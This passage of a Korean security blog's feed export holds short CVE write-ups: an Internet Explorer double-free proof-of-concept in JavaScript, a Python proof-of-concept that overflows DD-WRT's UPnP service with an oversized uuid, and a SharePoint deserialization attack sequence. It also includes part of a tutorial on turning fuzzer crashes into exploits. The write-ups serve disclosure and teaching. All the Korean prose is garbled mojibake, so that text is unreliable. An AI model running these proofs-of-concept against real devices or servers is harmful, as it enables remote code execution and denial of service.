&#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;elem.clearAttributes();<span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;&#125;;attr1.nodeValue = obj;attr2.nodeValue = <span class="hljs-number">123</span>;elem.setAttributeNode(attr1);elem.setAttributeNode(attr2);elem.removeAttributeNode(attr1); &lt;/script&gt;</code></pre><ol><li>HTML element ê°ì²´ <code>elem</code> ì™€ HTML attribute ê°ì²´ <code>attr1</code>, <code>attr2</code> ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.</li><li><code>attr1</code>ê³¼ <code>attr2</code> ì˜ <code>nodeValue</code>ì— ê°’ì„ í• ë‹¹í•©ë‹ˆë‹¤. ì´ë•Œ <code>attr1</code>ì˜ <code>nodeValue</code>ì—ëŠ” <code>valueOf</code> í•¨ìˆ˜ê°€ ì˜¤ë²„ ë¡œë“œëœ ê°ì²´ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</li><li><code>attr1</code> ë° <code>attr2</code>ë¥¼ ìš”ì†Œ ê°œì²´ <code>elem</code>ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.</li><li><code>elem.removeAttributeNode(attr1)</code>ì„ í˜¸ì¶œí•´ <code>elem</code>ì—ì„œ <code>attr1</code>ì„ ì œê±°í•©ë‹ˆë‹¤.</li><li><code>removeAttributeNode</code> ë©”ì„œë“œëŠ” <code>elem</code> ê°ì²´ì˜ ëª¨ë“  ì†ì„± ê°ì²´ì¸ <code>attr1</code> ê³¼ <code>attr2</code>ë¥¼ ì§€ìš°ê¸° ìœ„í•´ <code>clearAttributes</code>ê°€ í˜¸ì¶œë˜ëŠ” ë™ì•ˆ <code>valueOf</code> í•¨ìˆ˜ì— ëŒ€í•œ ì½œë°±ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.</li><li><code>valueOf</code> ì½œë°±ì´ ì¢…ë£Œë˜ë©´ IE íƒ­ í”„ë¡œì„¸ìŠ¤ê°€ NULL í¬ì¸í„°ë¥¼ ì°¸ì¡°í•˜ê²Œ ë˜ì–´ í¬ë˜ì‹œê°€ ë°œìƒí•©ë‹ˆë‹¤.</li></ol><p><code>removeAttributeNode(attr1)</code>ëŠ” ë‚´ë¶€ì ìœ¼ë¡œ <code>CBase::GetIntoBSTRAt</code> í•¨ìˆ˜ì—ì„œ <code>attr1</code>ì˜ <code>nodeValue</code>ê°€ ì¡´ì¬í•˜ë©´ BSTRë¡œ ë³€í™˜í•´ BSTR ê°’ì„ <code>CAttribute.nodeValue(+0x30)</code>ì— ì €ì¥í•˜ëŠ”ë°, ì´ ê³¼ì •ì—ì„œ <code>valueOf</code> ì½œë°±ì´ íŠ¸ë¦¬ê±° ë©ë‹ˆë‹¤. <code>valueOf</code> ì½œë°± í•¨ìˆ˜ì˜ <code>elem.clearAttributes()</code>ë¡œ ì¸í•´ <code>attr1</code>ì´ í•´ì œëœ ì´í›„ ì •ìƒì ì¸ <code>attr1</code>ì˜ Delete í”„ë¡œì„¸ìŠ¤ì— ì˜í•´ Double Free Bugê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ arbitrary read/writeë¥¼ í†µí•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>use after free</tag>
      
      <tag>microsoft</tag>
      
      <tag>internet explorer</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27137: DD-WRT UPNP Buffer Overflow</title>
    <link href="/2021/03/25/insu/2021-03-25/"/>
    <url>/2021/03/25/insu/2021-03-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/">SSD Advisory â€“ DD-WRT UPNP Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DD-WRT</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ë¦¬ëˆ…ìŠ¤ ê¸°ë°˜ì˜ ë¬´ì„  ë¼ìš°í„° ë° ì•¡ì„¸ìŠ¤ í¬ì¸íŠ¸ íŒì›¨ì–´ì¸ DD-WRTì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ í†µí•´ Code Executionì„ í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Universal Plug and Play(UPNP)ëŠ” ì»´í“¨í„°, í”„ë¦°í„°, ì¸í„°ë„· ê²Œì´íŠ¸ì›¨ì´, ì™€ì´íŒŒì´ access point, ëª¨ë°”ì¼ ì¥ì¹˜ì™€ ê°™ì€ ë„¤íŠ¸ì›Œí¬ ì¥ì¹˜ë“¤ì´ ë„¤íŠ¸ì›Œí¬ì—ì„œ ì„œë¡œë¥¼ íƒìƒ‰í•˜ê³  ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ ê¸°ëŠ¥ì„ ì œê³µí•˜ëŠ” ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œì…ë‹ˆë‹¤. ê¸°ë³¸ ì„¤ì •ì—ì„œ DD-WRTì˜ UPNPëŠ” ë¹„í™œì„±í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤. UPNPëŠ” UDP í˜•ì‹ì˜ ì¸ì¦ë˜ì§€ ì•Šì€ í”„ë¡œí† ì½œë¡œ DD-WRTì— UPNP ì„œë¹„ìŠ¤ê°€ í™œì„±í™”ëœ ê²½ìš° DD-WRTì˜ LANì— ìˆëŠ” í•´ì»¤ê°€ í° í¬ê¸°ì˜ <code>uuid</code> ê°’ì„ ì „ì†¡í•˜ì—¬ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” <code>ssdp.c</code> ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="https://ssd-disclosure.com/wp-content/uploads/2021/03/image-1024x590.png" alt="img"></p><p>name ë²„í¼ì˜ í¬ê¸°ëŠ” 128 bytesì´ì§€ë§Œ, ë°ì´í„°ë¥¼ ë³µì‚¬í•  ë•Œ ë°ì´í„° í¬ê¸° ê°’ì— ëŒ€í•œ ê²€ì¦ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ì„œ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•©ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì˜ POCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> sockettarget_ip = <span class="hljs-string">&quot;192.168.15.124&quot;</span> <span class="hljs-comment"># IP Address of Target</span>off = <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">164</span>ret_addr = <span class="hljs-string">&quot;AAAA&quot;</span> payload = off + ret_addrpacket = \    <span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \    <span class="hljs-string">&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \    <span class="hljs-string">&#x27;ST:uuid:&#x27;</span>+payload+<span class="hljs-string">&#x27;\r\n&#x27;</span> \    <span class="hljs-string">&#x27;MX:2\r\n&#x27;</span> \    <span class="hljs-string">&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \    <span class="hljs-string">&#x27;\r\n&#x27;</span>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)s.sendto(packet.encode(), (target_ip, <span class="hljs-number">1900</span>) )</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bof</tag>
      
      <tag>insu</tag>
      
      <tag>dd-wrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-27076: SharePoint Replay Style Deserialization ì·¨ì•½ì </title>
    <link href="/2021/03/25/idioth/2021-03-25/"/>
    <url>/2021/03/25/idioth/2021-03-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">CVE-2021-27076: A REPLAY-STYLE DESERIALIZATION ATTACK AGAINST SHAREPOINT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft SharePoint</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePointì—ì„œ session stateë¥¼ ì•…ìš©í•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. SharePointì˜ InfoPathì—ì„œ ë¬¸ì„œëŠ” serialize ëœ í›„ session stateì— ì €ì¥ë©ë‹ˆë‹¤. session stateì—ì„œ ì½ì€ ë°ì´í„°ëŠ” <code>BinaryFormatter.Deserialize</code>ë¡œ ì „ì†¡ë˜ëŠ”ë°, í•´ì»¤ê°€ arbitrary dataë¥¼ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë©´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>SharePoint ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ session state mechanismì„ í†µí•´ ì²¨ë¶€ íŒŒì¼ ì—…ë¡œë“œ ë°ì´í„°ëŠ” ì²¨ë¶€ íŒŒì¼ ì—…ë¡œë“œ session stateì— ì¶”ê°€ëœ ë°ì´í„°ì— í•´ë‹¹í•˜ëŠ” key(<code>editingSessionId</code>)ë¥¼ í†µí•´ ê²€ìƒ‰ë©ë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ <code> DocumentSessionState</code> Deserialization ë°ì´í„°ëŠ” Deserialization session stateì— ì¶”ê°€ëœ ë°ì´í„°ì— í•´ë‹¹í•˜ëŠ” keyë¥¼ í†µí•´ ê²€ìƒ‰ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ <code>editingSessionId</code>ê°€ í´ë¼ì´ì–¸íŠ¸ì— ì˜í•´ ì¡°ì‘ë  ìˆ˜ ìˆì–´ ì²¨ë¶€ íŒŒì¼ ë°ì´í„°ë¥¼ <code>DocumentSessionState</code> Deserializationì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì²¨ë¶€ íŒŒì¼ì„ ì—…ë¡œë“œí•  ë•Œ session state keyëŠ” í´ë¼ì´ì–¸íŠ¸ì—ì„œ í™•ì¸í•  ìˆ˜ ì—†ê³ , ì„œë²„ì˜ <code>DocumentSessionState</code> ê°ì²´ì— ì¡´ì¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì²¨ë¶€ íŒŒì¼ mechanismì˜ documentì˜ state keyë¥¼ ì „ì†¡í•˜ì—¬ serialize ëœ <code>DocumentSessionState</code>ë¥¼ í´ë¼ì´ì–¸íŠ¸ì—ì„œ ì²¨ë¶€ íŒŒì¼ë¡œ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì „ì²´ì ì¸ ê³µê²© íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>InfoPath ë¦¬ìŠ¤íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.</li><li>ë¦¬ìŠ¤íŠ¸ì— ìƒˆ í•­ëª©ì„ ì¶”ê°€í•©ë‹ˆë‹¤.</li><li>í•­ëª©ì— deserialize ë  arbitrary objectë¥¼ í¬í•¨í•œ fake InfoPath <code>DocumentSessionState</code> íŒŒì¼ì„ ì²¨ë¶€í•©ë‹ˆë‹¤.</li><li>í˜ì´ì§€ì˜ HTMLì—ì„œ documentì˜ state keyë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.</li><li><code>FormServerAttachments.aspx</code> í˜ì´ì§€ì— documentì˜ state keyë¥¼ ì „ì†¡í•˜ì—¬ serialize ëœ <code>DocumentSessionState</code>ë¥¼ ì–»ìŠµë‹ˆë‹¤.</li><li>ë°˜í™˜ëœ ë°ì´í„°ì—ì„œ 3ì—ì„œ ì¶”ê°€í•œ ì²¨ë¶€ íŒŒì¼ì˜ state keyë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.</li><li>ì²¨ë¶€ íŒŒì¼ì˜ state keyë¥¼ undocumented client-side APIì— ì „ì†¡í•˜ì—¬ deserialization mechnismì—ì„œ ì²¨ë¶€ íŒŒì¼ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ì›ê²© ì½”ë“œ ì‹¤í–‰ì€ arbitrary objectê°€ ì„œë²„ì—ì„œ deserialization ë  ë•Œ ì‹¤í–‰ë©ë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>deserialization</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 3</title>
    <link href="/2021/03/24/l0ch/bughunting-tutorials-part3/"/>
    <url>/2021/03/24/l0ch/bughunting-tutorials-part3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 1</a> </p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 2</a></p><p>ì €ë²ˆ ê¸€ì—ì„œ ì˜ˆê³ í–ˆë˜ ëŒ€ë¡œ, ë³¸ê²©ì ì¸ ë¶„ì„ì„ ì‹œì‘í•´ë³´ê² ìŠµë‹ˆë‹¤! ì´ë²ˆ ê¸€ì€ ì‚½ì§ˆì—ì„œ ì‹œì‘í•´ ì‚½ì§ˆë¡œ ëë‚˜ëŠ” ê¸€ì´ë¯€ë¡œ ë©˜íƒˆ ë‚˜ê°ì— ìœ ì˜í•˜ì‹œê¸° ë°”ëë‹ˆë‹¤â€¦ ë­ ì–´ì¨Œë“  ìµìŠ¤ í•˜ê¸°ë§Œ í•˜ë©´ ë˜ë‹ˆê¹Œìš”! ê·¸ëŸ¼ Part 3 ì‹œì‘í•˜ê² ìŠµë‹ˆë‹¤.</p><h1 id="From-Crash-to-Exploit"><a href="#From-Crash-to-Exploit" class="headerlink" title="From Crash to Exploit"></a>From Crash to Exploit</h1><p>ì´ì œ ì œ í¼ì €ì—ì„œ ë‚˜ì™”ë˜ í¬ë˜ì‹œë¥¼ ë¶„ì„í•´ë³¼ê²Œìš”.(ìœ„ì— ìˆëŠ” ì‹œë“œ íŒŒì¼ë¡œ ëŒë¦° ê±´ ì•„ë‹™ë‹ˆë‹¤. ì €ë„ ê·€ì°®ì•„ì„œ ê·¸ëƒ¥ í¬ë¡¤ë§í•´ì„œ ì¼ì–´ìš” ã…ã…) </p><p>ì¼ë‹¨ í¬ë˜ì‹œ í´ë”ì— ë“¤ì–´ê°€ë©´ ì´ë ‡ê²Œ íŒŒì¼ë“¤ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--016.jpg" alt="./bughunting-tutorials-part3/image--016.jpg"></p><p>ë‹¤ë¥¸ ê±°ë¥¼ ë¨¼ì € ë³´ê¸° ì „ì— ë¨¼ì € í¬ë˜ì‹œê°€ ì¬í˜„ë˜ëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ê°„í˜¹ ê°€ë‹¤ê°€ ì¬í˜„ì´ ì•ˆ ë˜ëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤. í™ ë¬¸ì œì—¬ì„œ ì¬í˜„ì´ ì•ˆ ë˜ëŠ” ê²½ìš°ê°€ ëŒ€ë¶€ë¶„ì…ë‹ˆë‹¤. ì¬í˜„ì´ ì˜ ì•ˆ ë˜ëŠ” í¬ë˜ì‹œì¼ ê²½ìš°ì—ëŠ” ë””ë²„ê¹…í•˜ê¸°ì—ë„ í˜ë“¤ê¸° ë•Œë¬¸ì— ì¬í˜„ë˜ëŠ” í™•ë¥ ì„ ë³´ê³  í™•ë¥ ì´ ë„ˆë¬´ ë‚®ìœ¼ë©´ ë‹¤ë¥¸ í¬ë˜ì‹œë¥¼ ë¶„ì„í•˜ì‹œëŠ” ê²ƒì„ ì¶”ì²œë“œë¦½ë‹ˆë‹¤. </p><p>ê·¸ë¦¬ê³  ì¬í˜„ì´ ë˜ëŠ” ì§€ë¥¼ í™•ì¸í•  ë•Œì—ëŠ” JIT ëª¨ë“œë¡œ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ë””ë²„ê±°ë¥¼ ë¶™ì¸ ìƒíƒœì—ì„œ í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ë©´ ë””ë²„ê±°ë¥¼ ì•ˆ ë¶™ì¸ ìƒíƒœë‘ í™ ë°°ì • ë“±ì´ ì¡°ê¸ˆì”© ë‹¬ë¼ì„œ ì¬í˜„ì´ ë˜ë˜ ê²Œ ì•ˆë˜ê¸°ë„ í•˜ê³  ì´ìƒí•œ ë°ì„œ í¬ë˜ì‹œê°€ ë‚˜ê¸°ë„ í•©ë‹ˆë‹¤. Windbgì˜ ê²½ìš° ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ í‚¨ CMD ì°½ì—ì„œ <code>windbg â€“I</code> ëª…ë ¹ì–´ë§Œ ì…ë ¥í•˜ë©´ ë°”ë¡œ JIT ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì¬í˜„ì´ ë˜ëŠ”ì§€ í™•ì¸í•œ ë‹¤ìŒì—ëŠ” ë³´í†µ msec í™•ì¥ì ì „ì— <code>e0</code>ìœ¼ë¡œ ë˜ì–´ ìˆëŠ” íŒŒì¼ì„ ë´…ë‹ˆë‹¤. msec íŒŒì¼ì€ í¬ë˜ì‹œ ë°œìƒ ë•Œì˜ ëª¨ë“  ë¡œê·¸ë¥¼ ë³´ì—¬ì£¼ëŠ” ë°ìš”. <code>e0</code>ì´ ì•„ë§ˆ ì²˜ìŒ í¬ë˜ì‹œë¥¼ ë‚¬ì„ ë•Œì˜ ë¡œê·¸ ê°™ìŠµë‹ˆë‹¤. ê·¼ë° ë‹¤ë¥¸ ê±° ë´ë„ ë˜ê¸´ í•˜ëŠ” ë° ì €ëŠ” ë³´í†µ ì´ê±° í•˜ë‚˜ë§Œ ë´ìš”. ì•ì— ê²ƒë“¤ì€ ì¢€ ë›°ì–´ë„˜ê³  ë’¤ì— ë ˆì§€ìŠ¤í„° ì •ë³´ë“¤ë¶€í„° ë³¼ê²Œìš”.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled.png" alt="./bughunting-tutorials-part3/Untitled.png"></p><p>ìš´ ì¢‹ê²Œ ë°”ë¡œ <code>call</code>ì—ì„œ í„°ì¡Œë„¤ìš”!!! ë­ ì´ê±°ëŠ” ìš´ì´ ì¢‹ì€ ê²½ìš°ë‹ˆê¹Œ ã… ã…  ë³´í†µ ë‹¤ë¥¸ í¬ë˜ì‹œë“¤ì€ <code>call</code>ì´ë‚˜ <code>jmp</code>ì—ì„œ ë‚˜ëŠ” ê²½ìš°ê°€ ê±°ì˜ ì—†ì£  ã… ã… ã…  ê·¸ë˜ë„ ë¶„ì„ ë°©ë²•ì€ ë˜‘ê°™ìœ¼ë‹ˆê¹Œ ê± ë¶„ì„í•˜ë©´ ë©ë‹ˆë‹¤.</p><p>ì´ í¬ë˜ì‹œì˜ ì‹œë“œ íŒŒì¼ ê°™ì€ ê²½ìš°ì—ëŠ” ì œê°€ ì¸í„°ë„·ì—ì„œ í¬ë¡¤ë§í•´ì„œ ë„£ì€ ì‹œë“œ íŒŒì¼ì´ë¼ ë°ì´í„°ê°€ ë­ê°€ ë“¤ì–´ê°€ ìˆëŠ”ì§€ ëª¨ë¦…ë‹ˆë‹¤. ì‚¬ì‹¤ ì‹œë“œ íŒŒì¼ì„ ìœ„ì—ì„œ ì²˜ëŸ¼ ì§ì ‘ ë§Œë“¤ì–´ì„œ í•˜ëŠ” ê²ƒë„ ì¢‹ì§€ë§Œ ê·€ì°¨ë‹ˆì¦˜ì´ ë°œë™í•˜ê³  ì§ì ‘ ë§Œë“¤ê¸° í˜ë“  íŒŒì¼ë“¤ë„ ìˆê¸° ë•Œë¬¸ì— ì¸í„°ë„·ì—ì„œ í¬ë¡¤ë§í•´ì˜¤ëŠ” ê²ƒë„ ì¢‹ì€ ë°©ë²•ì…ë‹ˆë‹¤. (ì‚¬ì‹¤ ê°€ì¥ í° ì´ìœ ëŠ” ê·€ì°®ê¸° ë•Œë¬¸ì´ì£ )</p><p>ì•”íŠ¼ ì´ëŸ´ ë•Œì—ëŠ” ë¨¼ì € hxdë¡œ ì»¨íŠ¸ë¡¤ëœ ê°’ì„ ì°¾ì•„ë³´ëŠ” ê²Œ ì¢‹ìŠµë‹ˆë‹¤. ìš´ì´ ì¢‹ìœ¼ë©´ ì§„ì§œ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆëŠ” ê°’ì´ ë°”ë¡œ ìˆëŠ” ê²½ìš°ê°€ ìˆê±°ë“ ìš”. ì €ë„ ì´ íŒŒì¼ì„ ë¶„ì„í•  ë•Œ ìš´ì´ ì¢‹ê²Œë„ <code>ecx</code>ì˜ ê°’ì´ ë°”ë¡œ íŒŒì¼ì— ì €ì¥ë˜ì–´ ìˆì—ˆê³  ë°”ë¡œ <code>ecx</code>ë¥¼ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.(ë’¤ì— ë‚˜ì˜¤ê² ì§€ë§Œ ë©”ëª¨ë¦¬ì— ASLR ì´ ê±¸ë ¤ìˆì–´ì„œ í° ì˜ë¯¸ëŠ” ì—†ìŠµë‹ˆë‹¤) ë³´í†µ ê°’ì—ì„œ ë”í•˜ê±°ë‚˜ ë¹¼ê±°ë‚˜ ë˜ í¬ì¸í„°ë¡œ ì‚¬ìš©í•´ì„œ ë‹¤ë¥¸ ê°’ì„ ê°€ì ¸ì˜¤ê±°ë‚˜ í•˜ëŠ” ê²½ìš°ê°€ ë§ê¸° ë•Œë¬¸ì— ë§ì€ ê¸°ëŒ€ë¥¼ í•˜ë©´ ì•ˆ ë©ë‹ˆë‹¤â€¦. í›„ìš°â€¦ </p><p>ì´ ì •ë„ë¡œëŠ” ëŒ€ì¶© ì•Œì•˜ê³  ë‹¤ìŒìœ¼ë¡œ ì½œ ìŠ¤íƒì„ ë´…ì‹œë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%201.png" alt="./bughunting-tutorials-part3/Untitled%201.png"></p><p>í¬ë˜ì‹œê°€ ë°œìƒí•˜ê¸° ì§ì „ ì–´ë–¤ í•¨ìˆ˜ë“¤ì´ ë¶ˆë ¤ì¡ŒëŠ”ì§€ ëŒ€ëµì ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ì‹¤ ì´ë˜ ë†“ê³  ì‹¤ì œë¡œ ë””ë²„ê±°ì— í™•ì¸í•´ë³´ë©´ ì½œ ìŠ¤íƒì´ ê¹¨ì ¸ìˆê±°ë‚˜ ì¢€ ë‹¤ë¥´ê±°ë‚˜ í•˜ëŠ” ê²½ìš°ë„ ìˆëŠ” ë° ì—¬ê¸°ì—ì„œëŠ” ê·¸ëƒ¥ ì°¸ê³ ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.</p><p>ë‹¤ìŒìœ¼ë¡œëŠ” !exlploitable ëª¨ë“ˆì—ì„œ ë‚˜ì˜¨ ê²°ê³¼ë¬¼ì…ë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%202.png" alt="./bughunting-tutorials-part3/Untitled%202.png"></p><p>BFFì—ì„œëŠ” !exploitable ì˜ ê²°ê³¼ë¡œ í•´ë‹¹ í¬ë˜ì‹œê°€ exploitable í•œ ì§€ ì•ˆ í•œ ì§€ë¥¼ íŒë‹¨í•˜ëŠ”ë° ì‚¬ì‹¤ exploitableë¡œ ë‚˜ì˜¨ ê±°ëŠ” ê·¸ëŸ´ì‹¸í•˜ê¸´ í•œë° ë‹¤ë¥¸ ê±°ëŠ” ì˜ ëª¨ë¥´ê² ë„¤ìš”. ê°œì¸ì ìœ¼ë¡œëŠ” Unknownì— ìˆëŠ” í¬ë˜ì‹œë“¤ì´ ë” ìµìŠ¤ ì˜ëœë‹¤ëŠ” ë§ì´ ë§ì•„ì„œ ì´ ë¶€ë¶„ì€ ì™œ í¬ë˜ì‹œê°€ ë‚¬ëŠ”ì§€, exploitable í•œ ì´ìœ ê°€ ë­”ì§€ë§Œ ì°¸ê³ í•˜ê³  ë„˜ì–´ê°€ë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤.</p><p>ê°„ë‹¨í•˜ê²Œ ì–´ë–¤ ìœ í˜•ì˜ í¬ë˜ì‹œì¸ì§€ íŒŒì•…ì„ í–ˆê³  ì´ê²Œ ìµìŠ¤ ê°€ëŠ¥ì„±ì´ ìˆë‹¤ê³  íŒë‹¨ë˜ë©´ ì–´ë–¤ ë°”ì´íŠ¸ê°€ ë®¤í…Œì´íŠ¸ ë˜ì—ˆëŠ” ì§€ë¥¼ í™•ì¸í•©ë‹ˆë‹¤. ì•ì—ì„œ íŒŒì¼ì˜ êµ¬ì¡°ë¥¼ ì•Œì•˜ìœ¼ë‹ˆ ì–´ë–¤ ë°”ì´íŠ¸ê°€ ë®¤í…Œì´íŠ¸ ë˜ì—ˆëŠ” ì§€ë¥¼ í™•ì¸í•œë‹¤ë©´ ê·¸ ë°”ì´íŠ¸ê°€ ì–´ë–¤ ì—­í• ì„ í•˜ëŠ”ì§€ ëŒ€ì¶©ì€ ì•Œ ìˆ˜ ìˆê³  ì™œ í¬ë˜ì‹œê°€ ë°œìƒí–ˆëŠ”ì§€ ì¶”ì¸¡ì´ ê°€ëŠ¥í•˜ê² ì£ .</p><p>Hxdë¡œ ì˜¤ë¦¬ì§€ë„ íŒŒì¼ê³¼ minimized ëœ íŒŒì¼ì„ ì—´ì–´ì„œ ctrl+k ë¥¼ ëˆ„ë¥´ë©´ ë‘ íŒŒì¼ì˜ ì°¨ì´ì ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--018.jpg" alt="./bughunting-tutorials-part3/image--018.jpg"></p><pre><code class="hljs c">BITMAPINFOHEADER.biSize : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x1f</span>BITMAPINFOHEADER.biCompression : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x0A</span>BITMAPINFOHEADER.biClrUsed : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x02</span></code></pre><p>ì´ë ‡ê²Œ ë°”ë€Œì—ˆë„¤ìš”. <code>BiSize</code> ëŠ” <code>BITMAPINFOHEADER</code> ì˜ í¬ê¸°ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ë° ìœ„ì— ë³¸ êµ¬ì¡°ë¡œëŠ” ì•„ë¬´ë¦¬ ë´ë„ í¬ê¸°ê°€ ë‹¬ë¼ì§ˆ ìˆ˜ ì—†ë‹¤ëŠ” ê±¸ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í”„ë¡œê·¸ë¨ì—ì„œ â€œì—¬ê¸°ì— ìˆëŠ” ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ì„œ ë³µì‚¬ë¥¼ í•˜ëŠ” ë° ì´ ë°ì´í„°ê°€ ê¸°ì¡´ í¬ê¸°ë³´ë‹¤ í¬ê²Œ ë˜ë©´ì„œ ë³µì‚¬ë¥¼ ë” ë§ì´ í•˜ê²Œ ëœê³  ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ê²Œ ëœë‹¤â€ë¼ê³  ì¶”ì¸¡í•  ìˆ˜ ìˆì„ ê±° ê°™ìŠµë‹ˆë‹¤.</p><p><code>biCompression</code> ê³¼ <code>biClrUsed</code> ëŠ” ê°ê° ì••ì¶• ë°©ì‹ ê·¸ë¦¬ê³  ì‚¬ìš©ëœ ìƒ‰ìƒìˆ˜ë¥¼ ì˜ë¯¸í•˜ëŠ”ë° ì´ 